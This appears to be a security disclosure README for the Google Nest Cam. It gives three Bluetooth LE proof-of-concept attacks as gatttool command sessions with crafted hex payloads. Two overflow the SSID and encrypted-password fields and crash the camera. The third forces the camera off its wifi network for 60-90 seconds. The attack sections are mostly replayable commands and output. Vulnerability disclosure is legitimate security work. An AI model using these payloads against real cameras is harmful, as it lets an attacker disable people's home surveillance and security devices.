# Google-Nest-Cam-Bug-Disclosures


<h3>Buffer Overflow via SSID parameter</h3>

1. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]>`<br />
`(gatttool:20352): GLib-WARNING **: Invalid file descriptor.`<br />

2. Description<br />
The payload attempts to set an SSID with a length of 1 byte and sends 16.<br />
SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16<br />

3. Result<br />
Crash and reboot back to operational state

<h3>Buffer Overflow via Encrypted Password parameter</h3>

1. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b506574536d6172742d356e1a01AAAAAA`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]> `<br />
`(gatttool:20352): GLib-WARNING **: Invalid file descriptor.`<br />

2. Description<br />
The payload attempts to set the encrypted wifi password with a length of 1 byte and sends 3.<br />
SequenceNum=3a + Type=0312 + Length=0b + ssidVal=506574536d6172742d356e + type=1a + length=01 + encPass=AA*3<br />

3. Result<br />
Crash and reboot back to operational state


<h3>Force Wifi Reassociation</h3>

1. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b0a6574536d6172742d356e1a20232320`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3becb824ba437c13233ac2ff78b1776456e47a01`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3ca5787d2f5e53f394a512200228003210bc9253`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3d48cada7a0d921d57b2d26ae89c3a04DEADBEEF`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3e`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]> `<br />

2. Description<br />
The payload attempts to change Nest Cam's associated SSID causing temporary disassociation from the current Wifi SSID. Without knowing the encryption key, a valid password can not be set.
seqNum + 0312(type) 0b(len) + SSID + 1a(type) 20(len) + encPass
seqNum + encPass(cont)
seqNum + encPass(cont) + 2002280032(constant) + 10(len) + authTag
seqNum + authTag(cont) + 3a(UnknownType) 04(len) + DEADBEEF
seqNum(execute)

3. Result<br />
Camera dissociates from current wifi network to attempt association with newly set SSID. The camera goes offline for approximately 60-90 seconds before returning to the original Wifi network and resuming normal operation. No reboot or crash was observed.
